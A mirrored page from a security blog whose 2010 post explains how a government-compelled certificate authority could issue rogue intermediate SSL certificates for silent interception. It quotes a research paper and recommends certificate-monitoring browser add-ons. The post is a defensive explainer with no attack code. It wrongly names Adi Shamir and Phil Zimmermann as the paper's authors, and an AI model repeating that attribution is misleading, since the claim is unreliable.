			<i class="icon-folder-open-empty"></i> <a href="../cryptography.html" rel="category tag">Cryptography</a>, <a href="../../administration-systeme/linux.html" rel="category tag">Linux</a>, <a href="../../security.html" rel="category tag">Security</a>, <a href="../../administration-systeme.html" rel="category tag">System</a> <i class="icon-tag"></i> <a href="../../../tag/apache.html" rel="tag">Apache</a>, <a href="../../../tag/certificate.html" rel="tag">certificate</a>, <a href="../../../tag/chrome.html" rel="tag">chrome</a>, <a href="../../../tag/cve-2009-3555.html" rel="tag">CVE-2009-3555</a>, <a href="../../../tag/firefox.html" rel="tag">firefox</a>, <a href="../../../tag/mod-ssl.html" rel="tag">mod-ssl</a> <i class="icon-calendar"></i> <a href="../../../2010/04/05/updates-about-openssl-cve-2009-3555-client-renegociation.html" title="10:40 am" rel="bookmark"><time class="entry-date" datetime="2010-04-05T10:40:44+00:00">April 5, 2010</time></a><span class="by-author"> by <span class="author vcard"><a class="url fn n" href="../../../author/jc.html" title="View all posts by phocean" rel="author">phocean</a></span></span>.								</footer><!-- .entry-meta -->
	</article><!-- #post -->
	<article id="post-763" class="post-763 post type-post status-publish format-standard hentry category-cryptography category-security tag-mitm tag-rogue-certificate tag-sniff tag-ssl">
				<header class="entry-header">

						<h1 class="entry-title">
				<a href="../../../2010/04/04/possible-use-of-ssl-rogue-certificate-for-spying-purpose.html" title="Permalink to Possible use of SSL rogue certificates for spying purposes" rel="bookmark">Possible use of SSL rogue certificates for spying purposes</a>
			</h1>
								</header><!-- .entry-header -->

				<div class="entry-content">
			<!-- Adds 140x140 featured image to single post view -->
			<div class="excerpt-thumb">
							</div>
			<p>Recent work of security researchers on SSL MiTM attacks have shown how fragile the whole Internet security design could be.</p>
<p>But whereas some of these attacks concerns CA with insufficient security policies (md5 collisions) or some level of social engineering against the user (sslsniff), this <strong><a title="defeating ssl mitm" href="http://files.cloudprivacy.net/ssl-mitm.pdf" target="_blank">paper</a></strong> alerts us on a more serious and stealth threat.</p>
<p>It explains brilliantly, providing us with real case scenarios, how a CA (probably under the authority of a government agency or a similar powerful organisation) can create a rogue certificate that will be silently trusted by our browsers.</p>
<p>The problem relies in the chain of trust : a root CA delegates trust to intermediate CA, which can at this point generate any &#8220;valid&#8221; certificate they want, even for a domain they shouldn&#8217;t sign.</p>
<p>Excerpt :</p>
<blockquote><p><em>&lt;&lt; As an example, the Israeli government could compel StartCom, an Israeli CA to issue an intermediate CA certiﬁcate that falsely listed the country of the intermediate CA as the United States. This rogue intermediate CA would then be used to issue site certiﬁcates for subsequent surveillance activities. In this hypothetical scenario, let us imagine that the rogue CA issued a certiﬁcate for Bank Of America, whose actual certiﬁcate was issued by VeriSign in the United States. Were CertLock to simply evaluate the issuing CA’s country of the previously seen Bank of America certiﬁcate, and compare it to the issuing country of the rogue intermediate CA (falsely listed as the United States), CertLock would not detect the hijacking attempt. In order to detect such rogue intermediate CAs, a more thorough comparison must be conducted. &gt;&gt;</em></p></blockquote>
<p>In such a case, no browser will ever send an alert, so even the most experienced and most paranoid users would be easily cheated. It makes it very easy for an agency to conduct a man-in-the-middle attack, sniffing all of the user activity.<br />
So here is a need for an add-on.</p>
<p>As a Firefox user, I am using <strong><a title="Certificate Patrol" href="https://addons.mozilla.org/fr/firefox/addon/6415" target="_blank">Certificate Patrol</a></strong>. It basically alerts the user whenever the certificate of a site changes. The inconvenience is that it requires a long learning period and it also generates quite a lot of false positive (when a certificate is renewed, for instance).</p>
<p style="text-align: center;"><a href="../../../wp-content/uploads/2010/04/certpatrol.png" rel="lightbox[763]"><img class="aligncenter size-full wp-image-764" title="Certificate Patrol add-on" src="../../../wp-content/uploads/2010/04/certpatrol.png" alt="" width="394" height="409" /></a></p>
<p><strong>Adi Shamir</strong> and <strong>Phil Zimmerman</strong>, the author of the paper above, plan to publish a new add-on, <strong>Certlock</strong>. It will check carefully all the chain of trust for a certicate and send out an alert whenever a detail is incoherent, for instance when the country of the parent&#8217;s certificate is different from the country the rogue certificate is pretending to be.</p>
<p>I really hope Certlock is coming soon.</p>
					</div><!-- .entry-content -->
		
		<footer class="entry-meta">
			<i class="icon-folder-open-empty"></i> <a href="../cryptography.html" rel="category tag">Cryptography</a>, <a href="../../security.html" rel="category tag">Security</a> <i class="icon-tag"></i> <a href="../../../tag/mitm.html" rel="tag">MiTM</a>, <a href="../../../tag/rogue-certificate.html" rel="tag">rogue certificate</a>, <a href="../../../tag/sniff.html" rel="tag">sniff</a>, <a href="../../../tag/ssl.html" rel="tag">SSL</a> <i class="icon-calendar"></i> <a href="../../../2010/04/04/possible-use-of-ssl-rogue-certificate-for-spying-purpose.html" title="10:48 pm" rel="bookmark"><time class="entry-date" datetime="2010-04-04T22:48:48+00:00">April 4, 2010</time></a><span class="by-author"> by <span class="author vcard"><a class="url fn n" href="../../../author/jc.html" title="View all posts by phocean" rel="author">phocean</a></span></span>.								</footer><!-- .entry-meta -->
	</article><!-- #post -->			<nav id="nav-below" class="navigation" role="navigation">
				<h3 class="assistive-text">Post navigation</h3>
				<div class="nav-previous"><a href="11.html" ><span class="meta-nav">&larr;</span> Older posts</a></div>
				<div class="nav-next"><a href="9.html" >Newer posts <span class="meta-nav">&rarr;</span></a></div>
			</nav><!-- .navigation -->
			
		
		</div><!-- #content -->
	</section><!-- #primary -->


		</div><!-- #main .wrapper -->
	<footer id="colophon" role="contentinfo">
		<div class="site-info">
									<a href="https://wordpress.org/" class="imprint" title="Semantic Personal Publishing Platform">
				Proudly powered by WordPress			</a>
		</div><!-- .site-info -->
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript'>
/* <![CDATA[ */
var JQLBSettings = {"fitToScreen":"1","resizeSpeed":"400","displayDownloadLink":"0","navbarOnTop":"0","loopImages":"","resizeCenter":"","marginSize":"5","linkTarget":"_self","help":"","prevLinkTitle":"previous image","nextLinkTitle":"next image","prevLinkText":"\u00ab Previous","nextLinkText":"Next \u00bb","closeTitle":"close image gallery","image":"Image ","of":" of ","download":"Download","jqlb_overlay_opacity":"80","jqlb_overlay_color":"#000000","jqlb_overlay_close":"1","jqlb_border_width":"10","jqlb_border_color":"#ffffff","jqlb_border_radius":"0","jqlb_image_info_background_transparency":"100","jqlb_image_info_bg_color":"#ffffff","jqlb_image_info_text_color":"#000000","jqlb_image_info_text_fontsize":"10","jqlb_show_text_for_image":"1","jqlb_next_image_title":"next image","jqlb_previous_image_title":"previous image","jqlb_next_button_image":"https:\/\/phocean.net\/wp-content\/plugins\/wp-lightbox-2\/styles\/images\/next.gif","jqlb_previous_button_image":"https:\/\/phocean.net\/wp-content\/plugins\/wp-lightbox-2\/styles\/images\/prev.gif","jqlb_maximum_width":"","jqlb_maximum_height":"","jqlb_show_close_button":"1","jqlb_close_image_title":"close image gallery","jqlb_close_image_max_heght":"22","jqlb_image_for_close_lightbox":"https:\/\/phocean.net\/wp-content\/plugins\/wp-lightbox-2\/styles\/images\/closelabel.gif","jqlb_keyboard_navigation":"1","jqlb_popup_size_fix":"0"};
var JQLBSettings = {"fitToScreen":"1","resizeSpeed":"400","displayDownloadLink":"0","navbarOnTop":"0","loopImages":"","resizeCenter":"","marginSize":"5","linkTarget":"_self","help":"","prevLinkTitle":"previous image","nextLinkTitle":"next image","prevLinkText":"\u00ab Previous","nextLinkText":"Next \u00bb","closeTitle":"close image gallery","image":"Image ","of":" of ","download":"Download","jqlb_overlay_opacity":"80","jqlb_overlay_color":"#000000","jqlb_overlay_close":"1","jqlb_border_width":"10","jqlb_border_color":"#ffffff","jqlb_border_radius":"0","jqlb_image_info_background_transparency":"100","jqlb_image_info_bg_color":"#ffffff","jqlb_image_info_text_color":"#000000","jqlb_image_info_text_fontsize":"10","jqlb_show_text_for_image":"1","jqlb_next_image_title":"next image","jqlb_previous_image_title":"previous image","jqlb_next_button_image":"https:\/\/phocean.net\/wp-content\/plugins\/wp-lightbox-2\/styles\/images\/next.gif","jqlb_previous_button_image":"https:\/\/phocean.net\/wp-content\/plugins\/wp-lightbox-2\/styles\/images\/prev.gif","jqlb_maximum_width":"","jqlb_maximum_height":"","jqlb_show_close_button":"1","jqlb_close_image_title":"close image gallery","jqlb_close_image_max_heght":"22","jqlb_image_for_close_lightbox":"https:\/\/phocean.net\/wp-content\/plugins\/wp-lightbox-2\/styles\/images\/closelabel.gif","jqlb_keyboard_navigation":"1","jqlb_popup_size_fix":"0"};
/* ]]> */
</script>
<script type='text/javascript' src='/wp-content/plugins/wp-lightbox-2/wp-lightbox-2.min.js'></script>
<script type='text/javascript' src='/wp-content/themes/twentytwelve/js/navigation.js'></script>
<script type='text/javascript' src='/wp-includes/js/wp-embed.min.js'></script>
<!-- Generated in 1.576 seconds. Made 16 queries to database and 45 cached queries. Memory used - 27.67MB -->
<!-- Cached by DB Cache Reloaded Fix -->
</body>

<!-- Mirrored from phocean.net/category/security/page/10 by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 26 May 2019 07:59:44 GMT -->
<!-- Mirrored from phocean.net/category/security/page/10 by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 26 May 2019 07:59:44 GMT -->
</html>

<!-- Dynamic page generated in 1.547 seconds. -->